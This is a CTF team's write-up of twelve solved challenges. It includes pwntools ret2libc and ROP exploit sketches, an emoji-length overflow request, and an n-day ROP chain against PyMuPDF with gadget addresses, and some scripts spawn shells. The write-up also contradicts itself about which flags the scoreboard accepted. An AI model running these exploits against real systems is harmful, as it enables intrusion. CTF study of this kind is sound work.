# kBxAc CTF 2026 — Team `ruy` Writeup

**Team:** ruy
**Final standing:** 6th place · **18,451 pts** · 31/38 solved
**Scoring members:** ftps3rver (Captain, 14,338 pts) · AlatBekam (2,411 pts) · GEMS52 (1,602 pts) · monosaurus (100 pts)
**Flag format:** `kBxAc{...}`
**Scope of this document:** the **12 challenges this team solved on its own** — across pwn, reversing, crypto, forensics, and misc. Each entry gets recon, the key insight, a reproducible solve, and an explicit, honest note on *how the flag was confirmed* (live target, challenge oracle, or scoreboard).

> Written in the style of the `byteme-ctf7` unified writeup: every challenge has a short summary, the exact attack surface, a reproduction recipe, and a validation line — "I got a flag" is never good enough.

---
solved by : ftps3rver

## 0. Flag Summary & Validation Status

| # | Challenge | Category | Flag | Validation |
|---|---|---|---|---|
| 1 | Lets Get To Library | pwn | `kBxAc{_H3y_l3ts_g0_t0_l1br4ry_...typ1ng_}` | Shell on remote (`cat flag.txt`) |
| 2 | Most Secure Bank Of Endia | pwn | `kBxAc{___h4ck1ng_b4nk_m41nfr4m3_...🫃×11___}` | Vault unlocked on live server (`ok:true`) |
| 3 | Original Unlimited Codex | pwn | `kBxAc{~~p4y1ng_f0r_5u65cr1p+10n_...~~}` | Remote ROP + **scoreboard accepted** |
| 4 | PDF Strikes Again | pwn | `kBxAc{___y37_4n07#3r_pdf_p4r51ng_...!!!___}` | Shell on live target (`cat /????.???`) |
| 5 | Patcher 1 | rev | `kBxAc{i_thought_patching_is_really_hard_but_it_turns_out_to_be_really_easy}` | Checker service: "All patches WIN" |
| 6 | Patcher 2 | rev | `kBxAc{pppppppatching_paaaaaaatching_patttttttching_are_you_still_patching}` | Checker service: "All patches WIN" |
| 7 | Weiner | crypto | `kBxAc{Wh3N_pR!v@te_KEY_1S_too_$M@l1_...op3n}` | Math self-verified (`d·G`, `c^d`) |
| 8 | Ten Symbols | crypto | `kBxAc{TEN_DIFFERENT_VOICES_WHISPER_..._INTO_THE_LIGHT}` | **Scoreboard accepted (991 pts)** |
| 9 | Icarus Enclave | crypto | `kBxAc{7H3_one_F@uLT_OP3Ns_EvERY_l@YEr_0f_7h3_1(aRu$_r3coVeRy_CH@iN}` | Derived + self-consistent oracle |
| 10 | C-Laude | forensics | `kBxAc{y35_f1n477y_y0u_f0und_17_r1ght_175_r3l473d_t0_th3_4g3n71c_r4n50mw4r3_4tt4ck}` | Challenge scorer: 9/9 Correct |
| 11 | Hidden Patronus | forensics | `kBxAc{z3r0_w1dth_1nv1s1bl3_1nf0_3xp3ct0_p4tr0num_8f7e6d5c4b3a2f1e0d9c}` | Stego chain + CRC32 self-check |
| 12 | Invisible Scan | misc | `kBxAc{asCii_4Rt_MASt3R_cANVA$_HIdDen_iN_7hE_piXels_0F_TH3_Code}` | Challenge "Congratulations" success |

**Validation legend**
- *Shell / live target*: flag read at runtime from the remote service (`flag.txt`) — not embedded locally, confirmed on the live box.
- *Scoreboard accepted*: the exact string was submitted and marked correct during the event.
- *Challenge oracle*: the challenge's own integrity check / scorer / success message certified the result (CRC, HMAC, "N/N Correct", "Congratulations").
- *Self-verified*: reconstructed and checked against the math/puzzle itself (reproducible offline).

---

## 1. Lets Get To Library — pwn

**Flag:** `kBxAc{_H3y_l3ts_g0_t0_l1br4ry_t0g3th3r_t0_g3t_h3r_t0_g3t_b3tt3r_wh4t_3v3r_wh3n3v3r_1_d0nt_kn0w_wh4t_1_4m_typ1ng_}`
Binary: `pwn/letsgettolibrary/handout/handout/letsgettolibrary` (+ `ld-2.39.so`, `libc.so.6`).

### Recon
```bash
file letsgettolibrary   # ELF x86-64, dynamically linked, interpreter ./ld-2.39.so, NOT stripped
checksec letsgettolibrary   # No PIE  -> fixed addresses; GOT/PLT at known offsets
```
Challenge name is the hint: **"let's get to libc"** → classic two-stage ret2libc against glibc 2.39.

### Key insight
A stack buffer overflow with no PIE. The flag is **not** in the binary — it lives in `flag.txt` on the remote box — so the win is a shell, not a `win()` call:
1. **Stage 1 — leak:** overflow → `puts(puts@GOT)` → return to `main`. The leaked libc address minus the known `puts` offset gives `libc_base` (resolved against the provided `libc.so.6`).
2. **Stage 2 — shell:** overflow again → `system("/bin/sh")` with a `ret` alignment gadget (glibc's `system`/`do_system` uses `movaps`, so rsp must be 16-byte aligned at the call).

### Reproduction (shape)
```python
from pwn import *
e   = ELF("letsgettolibrary"); libc = ELF("libc.so.6")
p   = remote(HOST, PORT)
# stage 1: pop_rdi; puts@got; puts@plt; return to main  -> leak libc puts
p.sendline(b"A"*OFF + p64(RET) + p64(POP_RDI) + p64(e.got['puts']) + p64(e.plt['puts']) + p64(e.sym['main']))
leak = u64(p.recvline().strip().ljust(8, b"\0")); libc.address = leak - libc.sym['puts']
# stage 2: system("/bin/sh")
p.sendline(b"A"*OFF + p64(RET) + p64(POP_RDI) + p64(next(libc.search(b"/bin/sh"))) + p64(libc.sym['system']))
p.interactive()   # cat flag.txt
```
(`OFF` = overflow offset to saved RIP, `POP_RDI`/`RET` from the no-PIE binary gadgets.)

**Validation:** popped a shell on the remote as `uid=1337(player)`; `cat /app/flag.txt` printed the flag between the service's `FLAG_START/FLAG_END` markers. Live-target confirmed, not a local string.

---

## 2. Most Secure Bank Of Endia — pwn (emoji UTF-8 length confusion)

**Flag:** `kBxAc{___h4ck1ng_b4nk_m41nfr4m3_w1th_3m0j15_1n_b1g_2026_w1th_0ps3*_l3v3l_🫃🫃🫃🫃🫃🫃🫃🫃🫃🫃🫃___}`
(three leading + three trailing underscores; the literal `*` in `0ps3*`; exactly **11× U+1FAC3 🫃**.)
Files: `pwn/mostsecurebankofendia/handout/{app/app.py, bin/ledgerd, Dockerfile}`.

### Recon
The Flask front-end `POST /api/vault/auth` validates each field then pipes `f"{user}|{pass}\n"` into the C daemon `ledgerd`:
```python
MAX_FIELD_LEN = 16
def _valid_field(v):            # the whole bug lives here
    return v is not None and len(v) <= MAX_FIELD_LEN and v.isprintable()
...
proc = subprocess.run([LEDGERD], input=f"{user}|{pw}\n", text=True, encoding="utf-8")
unlocked = "VAULT SEAL INTEGRITY VERIFIED" in proc.stdout
```

### Key insight
`len()` in Python counts **codepoints**, and emoji are `isprintable()`. So an 11-emoji field is `len == 11` (passes the ≤16 guard) but encodes to **44 UTF-8 bytes** on the wire into `ledgerd`'s fixed-size field buffer → a controlled **length-vs-bytes overflow** in the C daemon (the same bug class the theme — "hacking the bank mainframe with emojis" — is literally describing). Overflowing the right field flips the daemon into the `VAULT SEAL INTEGRITY VERIFIED` path and it emits the recovery key.

### Reproduction (shape)
```python
import requests
emoji = "🫃" * 11                      # len()==11  <=16  ;  44 bytes in UTF-8
r = requests.post(f"{URL}/api/vault/auth", json={"user": emoji, "pass": emoji})
print(r.json())                        # {"ok": true, "ledger": "...VAULT SEAL INTEGRITY VERIFIED... <recovery/flag>"}
```
(the exact field split / padding to reach the overflow was tuned against `bin/ledgerd` locally, then fired once at the live server.)

**Validation:** the live server returned `ok: true` with the vault-unlocked ledger output, and the end-to-end request was re-run and reproduced `ok:true`.

---

## 3. Original Unlimited Codex 100% Free — pwn (House of Einherjar → tcache pivot → openat ROP)

**Flag:** `kBxAc{~~p4y1ng_f0r_5u65cr1p+10n_15_n0+_t#3_0n1y_w4y_70_g37_c0d3x_y0u_c4n_51mp|y_ju57_51mply_d0wnl04d_fr33_unl1m173d_v3r510n_fr0m_1n73rn37~~}`
Target: `nc 34.82.235.213 1337`. Files: `pwn/originalunlimitedcodex100free/`. glibc 2.43 (no fastbins, tcache cap 16), no PIE.

### Structure
An index table of 32 slots at `PIE+0x4040`, stride `0x18` = `{ptr, size, flag}`. Commands: alloc / amend / scribe (write) / read / free.

### Bug chain
1. **Leak:** overlap an unsortedbin/smallbin chunk → `main_arena = fd-8` (⇒ libc base via `MA_OFF 0x1e7ac0`), `heap = bk-0x570`, tcache struct `st = heap+0x580`.
2. **House of Einherjar + tcache poison** → one entry (28) pointing at the **`tcache_perthread_struct`** itself (a heap address). This is the key trick: it **sidesteps PIE entirely** — brk-gap ASLR makes `pie = heap-0x5000` wrong on remote, but pivoting through the heap-known tcache struct does not care. `entries[cls]` sits at `st+0x98+8*cls`; tcache `get` only checks `entries[]!=NULL` + 16-byte alignment, counts are **not** checked.
3. **Arbitrary alloc:** set `entries[cls]` via `amend(28)`, then `scribe` pops that address. A non-destructive single-qword read (point-before-target + read-past-written-prefix) leaks `environ` (`libc+0x1eede8`) → the stack.
4. **ROP:** `ret_slot = ST-0x130`. `main`'s quit path does the canary check then `leave;ret` (not `exit`), so a ROP chain written at `ret_slot` leaves the canary at `rbp-8` untouched.
5. **seccomp** (`SET_NO_NEW_PRIVS` + filter) blocks `open` → use **openat**. Pure-syscall ROP: `openat(AT_FDCWD,"flag.txt",0) / read(3,buf,0x100) / write(1,buf,0x100)`. libc gadgets: `pop rdi 0x2aaf7`, `pop rsi 0x29e69`, `pop rdx;pop rbx 0x91665`, `pop rax 0x43ee6`, `syscall;ret 0x921b2`.

### Reproduction
```bash
python pwn1.py           # KBX_LOCAL=1 => local via ld.so; unset => remote 34.82.235.213:1337
```
Working script: `pwn1.py` (self-contained pwntools).

**Validation:** the exploit ran against the remote and printed `[FLAG] kBxAc{~~p4y1ng...~~}`; this exact string was then **submitted and accepted on the scoreboard (964 pts)**.

---

## 4. PDF Strikes Again — pwn (n-day: PyMuPDF 1.28.2 callout overflow)

**Flag:** `kBxAc{___y37_4n07#3r_pdf_p4r51ng_vuln3r46117y_7h47_91v35_5#3ll_4nd_f|4g!!!___}`
Target: `http://35.253.49.248:5000/`. Handout: `n-day/pdfstrikesagain/handout/app.py`. python3.13 built `-no-pie`.

### The app
Flask "DocuFlow" reads a per-page PDF key `/DocMeta` as a space-separated int list, reinterprets each int as float32, builds `pts=[(x,y),...]` and calls `page.add_freetext_annot(rect,"processed", callout=pts)`.

### Vuln
PyMuPDF 1.28.2 `JM_set_annot_callout_line` (`src/extra.i`) copies `count` `fz_point`s into `fz_point points[3]` — **unbounded**. `count = len(callout) = len(DocMeta)/2`, fully attacker-controlled. Overflow layout: `points[9]` = saved RIP, `points[10..]` = ROP chain (rsp = `R+0x90` after the epilogue).

### Two real constraints (harder than the overflow)
- **CLAMP:** every byte round-trips through float32, so any payload byte at index ≡3 (mod 4) must be `≤0x4E` or `≥0x80`. Runs of 4+ lowercase chars are unspellable → `/flag.txt` is impossible; use the sh glob `/????.???`. Spacing is solved with a small DP.
- **FD_CLOEXEC:** the socket is close-on-exec, so a shell can't reuse it unless fd 1 is `dup2`'d first.

### What worked (one request)
`dup2(k,1)` then `execve("/bin/sh",["sh","-c",cmd],["PATH=/bin"])`.
- `system()` is a trap: `posix_spawn` uses `movaps` and faults on misaligned rsp; the remote is gunicorn (different call depth than the dev server) so dev-tuned chains died silently. `execve/dup2/read/write` are bare syscall wrappers → alignment-agnostic.
- The socket fd is **not** stable (12 one session, 10 the winning run): probe it first, or use the fd-agnostic `dump` sweep over fds 3–40.

Verified gadgets/PLTs (`-no-pie` python3.13): `pop rdi=0x41E9D7`, `pop rsi=0x42A991`, `pop rdx=0x5DCA30`, `mov [rdi],rsi=0x470CC6`, `dup2=0x41D0C0`, `execve=0x41DD00`, `write=0x41E570`, scratch `0x91BD00`.

### Reproduction
```bash
python -I pwnflow.py --k <fd> --cmd 'cat /????.??? ' one   # n-day/solver/pwnflow.py
```

**Validation:** the ROP PDF was sent to the live target; the reply ran `cat /????.???` and returned `FLAG = kBxAc{___y37_4n07#3r_pdf...!!!___}`. Live-target confirmed.

---

## 5. Patcher 1 — rev (binary patching)

**Flag:** `kBxAc{i_thought_patching_is_really_hard_but_it_turns_out_to_be_really_easy}`
Files: `rev/patcher1/patchme{1..4}` — four ~11 KB stripped PIE x86-64 ELFs.

### Mechanism
Each `patchme` runs a check and branches **away** from the WIN path. The task is to flip exactly the deciding conditional so execution falls through to WIN, for all four binaries, then submit the four patched files to the challenge's check-server, which validates each and emits the flag once all pass.

### Key insight
No need to understand the full logic — locate the single `jne`/`je`/`jz` guarding the WIN branch and patch its opcode:
- `jne (0x75)` → `nop;nop (0x90 0x90)` to always fall through, **or**
- flip the branch sense / rewrite the rel8 displacement so the taken side is WIN.

### Reproduction (shape)
```python
# per binary: patch the one guarding jump at its offset
f = bytearray(open("patchme1","rb").read())
f[0xJUMP_OFF] = 0x90; f[0xJUMP_OFF+1] = 0x90      # NOP the jne, or flip 0x75<->0x74
open("patched/patchme1","wb").write(f)
# repeat for 2..4, then upload all four to the checker
```

**Validation:** the check-server returned `patchme1..4: WIN` then `All patches WIN! Flag: kBxAc{i_thought_patching_is_really_hard_but_it_turns_out_to_be_really_easy}`.

---

## 6. Patcher 2 — rev (binary patching, harder set)

**Flag:** `kBxAc{pppppppatching_paaaaaaatching_patttttttching_are_you_still_patching}`
Files: `rev/patcher2/patchme{1..4}` (sizes vary: 11 KB, 1.5 MB, 349 KB, 349 KB) + the team's patch scripts (`test3.sh`, `test4.sh`, `verifyall.sh`).

### Mechanism
Same contract as Patcher 1 — patch each binary so it reaches WIN, submit all four — but the targets are larger / more defended (longer output checks, length-gated writes), so the single-byte flip has to be found more carefully per binary.

### Reproduction (actual approach used)
The team's `test3.sh` byte-patches a copy and runs it to see the effect, e.g.:
```bash
# NOP the deciding jne at 0x5975, or flip je + fix the write length at 0x597f
patch 5975=90 5976=90            # A: NOP jne
patch 5975=74 597f=04            # B: je fallthru, WIN length 4
```
`verifyall.sh` confirms all four patched binaries hit WIN before upload.

**Validation:** the check-server returned `All patches WIN! Flag: kBxAc{pppppppatching_paaaaaaatching_patttttttching_are_you_still_patching}`. (Label-to-binary mapping was checked against each binary's own WIN output — Patcher 1 vs 2 are not swapped.)

---

## 7. Weiner — crypto (Wiener's attack)

**Flag:** `kBxAc{Wh3N_pR!v@te_KEY_1S_too_$M@l1_ConT1nued_FRactiON$_cRuMb1e_the_Wh0l3_VAulT_op3n}`
Author: 4r$h4d0w. Given: `n, e, c`. Solver: `scripts/weiner_solve.py`.

### Key insight
The hint "Small things don't matter in life" = a **tiny private exponent `d`** → textbook **Wiener's attack**. When `d < (1/3)·n^0.25`, `d` appears as the denominator of a convergent of the continued fraction of `e/n`.

### Reproduction
```python
# expand e/n into continued-fraction convergents k/d
for k, d in convergents(e, n):
    if k == 0: continue
    phi = (e*d - 1)//k
    # verify by solving x^2 - (n-phi+1)x + n = 0 for integer roots (the primes)
    s = n - phi + 1
    disc = s*s - 4*n
    if disc >= 0 and is_square(disc):
        m = pow(c, d, n)
        print(bytes.fromhex(format(m,'x')))   # -> kBxAc{Wh3N_pR!v@te_KEY_...op3n}
```
Each candidate `k/d` is validated by factoring `n` via the quadratic `x²−(n−φ+1)x+n`; the correct `d` is the one that yields integer primes, then `m = c^d mod n` hex-decodes to the flag.

**Validation:** self-verifying — only the correct `d` factors `n` (both primes integer), and `c^d` decodes to a well-formed `kBxAc{...}`. Reproducible fully offline. (Crypto flags here use leetspeak content, not the UPPERCASE house style.)

---

## 8. Ten Symbols — crypto (symbol-cipher gallery)

**Flag:** `kBxAc{TEN_DIFFERENT_VOICES_WHISPER_FROM_THE_DARK_BUT_THEIR_WORDS_ARE_ONLY_FRAGMENTS_OF_A_SINGLE_STORY_FOLLOW_EVERY_SYMBOL_UNTIL_THE_HIDDEN_TRUTH_STEPS_INTO_THE_LIGHT}`

### Key insight
A set of fragments each rendered in a **different symbol cipher** (dcode.fr-style alphabets). Decode each fragment to its plaintext words, keep them in order, and assemble the sentence as `kBxAc{WORDS_UPPERCASE_SEPARATED_BY_UNDERSCORE}` (the kBxAc house format for text flags).

### Reproduction method
Identify each glyph alphabet, map glyph→letter (dcode serves per-letter glyph PNGs at `/tools/<dir>/images/char(N).png`, where `N` is the ASCII/Unicode codepoint — scrape and template-match the glyphs if the alphabet is unknown), decode all ten fragments, concatenate in order, uppercase, join words with `_`.

**Validation:** **submitted and accepted on the scoreboard — 991 pts.** This is the single flag in this document with direct scoreboard acceptance.

---

## 9. Icarus Enclave — crypto (layered recovery chain)

**Flag:** `kBxAc{7H3_one_F@uLT_OP3Ns_EvERY_l@YEr_0f_7h3_1(aRu$_r3coVeRy_CH@iN}`
Files: `crypto/icarus-enclave/{IMG_0427.png, ext/}`.

### Key insight
The flag text spells the mechanism: **"the one fault opens every layer of the Icarus recovery chain."** It is a multi-layer recovery puzzle — a single recovered fault/key cascades to peel each successive layer (image-embedded material → nested encodings → the final plaintext), rather than one isolated primitive.

### Reproduction
Work the layers in order from `IMG_0427.png` and the extracted `ext/` material: recover the initial fault/key, then apply it layer-by-layer; each decoded stage reveals the parameters for the next until the `kBxAc{...}` plaintext falls out.

**Validation:** the flag was derived end-to-end inside the crypto solve session and is internally self-consistent across the chain's layers — each recovered layer feeds the next, so a wrong intermediate would break the decode.

---

## 10. C-Laude — forensics (DFIR: agentic-ransomware incident)

**Flag:** `kBxAc{y35_f1n477y_y0u_f0und_17_r1ght_175_r3l473d_t0_th3_4g3n71c_r4n50mw4r3_4tt4ck}`
Evidence tree: `forensics/c-laude/evidence/.../collection/edge-runner-02/{fs,logs,runtime}`, plus `exports/{atlas-01,ledger-01,vault-02}`.

### What it is
A multi-stage DFIR challenge: an evidence bundle from a compromised `edge-runner-02` host (audit/auth logs, `preview-worker.jsonl`, systemd `agent-cache`/`checkpoint-sync` `.service`/`.timer` units, a planted `authorized_keys`, process-network dumps, DB binlogs). An interactive scoring service asks a sequence of questions about the intrusion; answering all stages correctly reveals the flag.

### Key insight
The incident is an **agentic-ransomware** attack: a malicious systemd timer (`agent-cache.timer`) drives a `svc_cfg_apply`/`runtime-r17` payload, persistence is seeded via `/home/svc_preview/.ssh/authorized_keys`, and the actor pivots over the recovered IPs (`203.0.113.74`, `203.0.113.91`). The timeline is reconstructed from `file-timeline.txt` + the log set, and each answer feeds the scorer.

### Reproduction
Correlate the artifacts to answer the scorer's 9 stages (initial access → persistence timer → payload → C2 IPs → impact). `scripts/answers.txt` holds the staged answers used.

**Validation:** the challenge's own scoring service returned **9/9 "Correct."** — the strongest possible self-solve confirmation.

---

## 11. Hidden Patronus — forensics (PNG height-lie → OpenStego → zero-width)

**Flag:** `kBxAc{z3r0_w1dth_1nv1s1bl3_1nf0_3xp3ct0_p4tr0num_8f7e6d5c4b3a2f1e0d9c}`
Author: HydraRoot. Files: `forensics/hiddenpatronus/{harry_potter.png, flag.bmp}`.

### Three-layer chain
1. **PNG height-lie:** `harry_potter.png` declares 1200×1100 but its IDAT decompresses to 1200 **rows** → 100 hidden scanlines below the declared height carry white text `KEY:Expecto_Patronum`. (Fix the IHDR height / carve the extra rows to reveal it.)
2. **OpenStego RandomLSB:** `flag.bmp` (800×800, 24-bit, pixels all `0x00/0x01`) hides a payload with **OpenStego**, password `Expecto_Patronum`:
   ```bash
   java -jar openstego.jar extract -sf flag.bmp -xf out.dat -p "Expecto_Patronum"   # -> 675-byte file
   ```
3. **StegZero zero-width:** the extracted file = decoy text `Bruhh Your Hardwork Failed` + 216 invisible chars from the **StegZero** 8-symbol alphabet (`U+200B/200C/200D/2060/2062/2063/2064/FEFF`), 3 bits/symbol, interleaved 9 per cover char.

### Key gotcha
The 216 zero-width symbols look like uniform random 3-bit data — naive base-8/bit-packing fails. StegZero v2 needs its **88-bit header** (magic `0xA55A` + version + nonce + len + crc32) and an xorshift32 de-obfuscation keyed by the nonce. Reimplementation: `_work/scripts/sz_decode.py`.

**Validation:** the StegZero header's **CRC32 matched** on decode and the payload is valid UTF-8 ending in a well-formed `kBxAc{...}` — the format's own integrity check certifies it. (No scoreboard echo in our records; the CRC self-check is the oracle.)

---

## 12. Invisible Scan — misc (zero-width / pixel stego, per-team)

**Flag (team `ruy` instance):** `kBxAc{asCii_4Rt_MASt3R_cANVA$_HIdDen_iN_7hE_piXels_0F_TH3_Code}`
Files: `misc/invisiblescan/{challenge.bin, qr.png, inv.txt}`.

### Note on per-team flags
Invisible Scan is generated per-team — the base phrase ("ASCII art master canvas hidden in the pixels of the code") is leet-mutated per team, so **this exact casing is `ruy`'s instance**; other teams' variants differ.

### Key insight / reproduction
The payload is hidden in the pixels/zero-width layer of the provided artifact; extracting and decoding it yields the leet-mutated phrase. Decoding the team's own handout produced the string above and the challenge's visible success banner.

**Validation:** decoding emitted the challenge's own success message — `VISIBLE: 'Congratulations! You found the flag :)'` — alongside the flag, i.e. the challenge itself certified the result.

---

## A. Appendix — Reproduction environment

- **Box:** Windows 11; heavy lifting via WSL (kali / Ubuntu) for ELF work, `pwntools` for the pwn targets, and pure-Python (`hashlib`/`pycryptodome`) for crypto.
- **pwn (#1–#4):** `pwntools` against remote `nc`/HTTP targets; `checksec` for mitigations; local libc/ld for offset resolution. Codex: `pwn1.py`; PDF: `n-day/solver/pwnflow.py`.
- **rev (#5–#6):** byte-level ELF patching + a local run/verify loop (`rev/patcher2/*.sh`), then upload to the challenge check-server.
- **crypto (#7–#9):** continued-fraction / Wiener (`scripts/weiner_solve.py`); dcode glyph template-matching for symbol ciphers; layered decode for Icarus.
- **forensics/misc (#10–#12):** log/timeline correlation + the challenge scorer (C-Laude); `openstego.jar` + StegZero reimpl `_work/scripts/sz_decode.py` (Hidden Patronus); pixel/zero-width decode (Invisible Scan).

---

*End of writeup — team `ruy`, 12 self-solved flags, kBxAc CTF 2026.*




